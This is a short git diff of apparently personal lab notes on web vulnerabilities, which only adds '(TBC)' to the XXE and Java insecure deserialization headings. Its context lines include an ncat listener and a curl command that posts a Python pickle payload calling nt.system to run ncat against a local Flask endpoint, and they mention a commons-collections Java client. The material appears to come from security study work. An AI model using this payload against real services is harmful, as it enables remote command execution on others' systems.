@@ -26,7 +26,7 @@ https://www.youtube.com/watch?v=ySJwlMsFbco
 Refer to script
 
 
-XXE injection
+XXE injection (TBC)
 ------------------------
 https://www.youtube.com/watch?v=kiGoOuuXWFI
 
@@ -38,7 +38,7 @@ ncat -klnvp 9000
 curl -d "function=decode&input=\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x13ncat 127.0.0.1 9000\x94\x85\x94R\x94." http://127.0.0.1:5000/INSEC/
 
 
-Java Insecure Deserialization
+Java Insecure Deserialization (TBC)
 -------------------------
 cd C:\Program Files\Java\jdk-14.0.2\bin\
 java.exe -Dfile.encoding=Cp1252 -classpath "D:\GitAssignment\Flask\test\bin;D:\GitAssignment\Flask\test\lib\commons-collections4-4.0.jar" test.Client
